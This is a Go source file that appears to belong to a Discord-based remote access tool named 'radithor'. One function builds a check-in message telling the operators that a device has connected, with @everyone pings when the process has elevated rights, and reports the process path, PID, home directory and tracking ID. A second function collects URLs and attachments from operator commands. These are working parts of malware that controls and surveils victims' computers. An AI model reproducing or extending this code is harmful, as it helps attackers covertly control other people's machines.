package discord_utils

import (
	"fmt"
	"os"
	"regexp"
	"shared/config"

	"radithor/bot/discord"
	"radithor/store"
)

func GetConnectionMsg(new bool) string {
	var mention string

	if store.IsElevated {
		mention = "@everyone"
	} else {
		mention = "@here"
	}

	message := "This device has reconnected."
	if new {
		message = "A new device has been connected."
	}

	var trackingId string

	if config.GetConfigString(store.TRACKING_ID) != "" {
		trackingId = " - " + config.GetConfigString(store.TRACKING_ID)
	}

	version := fmt.Sprintf(
		"[%d.%d %s]",
		store.VERSION_UPDATE,
		store.VERSION_PATCH,
		trackingId,
	)

	homePath, _ := os.UserHomeDir()

	info := fmt.Sprintf(
		"Elevated: %t\nProcess Path: %q\nProcess ID: %d\nHome Path: %q",
		store.IsElevated,
		store.ExecPath,
		os.Getpid(),
		homePath,
	)

	return fmt.Sprintf(
		"%s %s %s\n%s\nDo `%shelp` for a list of commands.",
		mention,
		message,
		version,
		info,
		config.GetConfigString(store.COMMAND_PREFIX),
	)
}

func GetUrls(ctx *discord.CommandContext) []string {
	var urls []string

	regex := regexp.MustCompile(`https?://[^\s]+`)

	matches := regex.FindAllString(ctx.Content, -1)
	urls = append(urls, matches...)

	for _, attachment := range ctx.Attachments {
		urls = append(urls, attachment.URL)
	}

	refrence := ctx.GetReferenceMsg()
	if refrence != nil {
		for _, attachment := range refrence.Attachments {
			urls = append(urls, attachment.URL)
		}

		matches := regex.FindAllString(refrence.Content, -1)
		urls = append(urls, matches...)
	}

	return urls
}
